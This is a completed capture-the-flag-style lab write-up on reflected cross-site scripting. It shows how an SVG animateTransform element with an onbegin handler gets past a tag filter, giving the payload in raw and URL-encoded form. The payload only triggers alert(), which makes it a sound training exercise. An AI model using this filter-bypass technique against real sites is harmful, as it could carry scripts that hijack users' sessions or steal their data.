# Reflected XSS with some SVG markup allowed

## Lab Overview
**Difficulty:** Apprentice  
**Vulnerability Type:** Reflected Cross-Site Scripting (XSS)  
**Context:** HTML content reflection with SVG tag filtering  
**Objective:** Call `alert()`  
**Status:** ✅ Solved

---

## The Reflection Point
User input from the `search` query parameter is reflected into the HTML response:

```html
<h1>0 search results for 'USER_INPUT'</h1>
```

Common HTML tags are blocked, but some SVG tags and events are still allowed.

---

## Working Payload

```html
<svg><animateTransform onbegin=alert(1) attributeName=transform type=scale from=1 to=1 dur=1s>
```

**URL-encoded version:**
```
%3Csvg%3E%3CanimateTransform%20onbegin%3Dalert(1)%20attributeName%3Dtransform%20type%3Dscale%20from%3D1%20to%3D1%20dur%3D1s%3E
```

---

## Why This Works
- The WAF blocks many tags, but `animateTransform` inside `svg` is allowed.
- The `onbegin` event fires automatically when the animation starts.
- The handler executes `alert(1)` without user interaction.

---

## Step-by-Step
1. In the search box, submit the payload:
   ```html
   <svg><animateTransform onbegin=alert(1) attributeName=transform type=scale from=1 to=1 dur=1s>
   ```
2. The input is reflected in the page.
3. The SVG animation begins, triggering `onbegin`.
4. `alert(1)` executes and the lab is solved.

---

## Key Takeaways
- SVG has many executable events that bypass common tag filters.
- `animateTransform` with `onbegin` is a reliable auto-trigger for reflected XSS.
- Always test SVG tags when standard HTML tags are blocked.

---

**Date Completed:** February 3, 2026  
**Payload Used:** `<svg><animateTransform onbegin=alert(1) attributeName=transform type=scale from=1 to=1 dur=1s>`
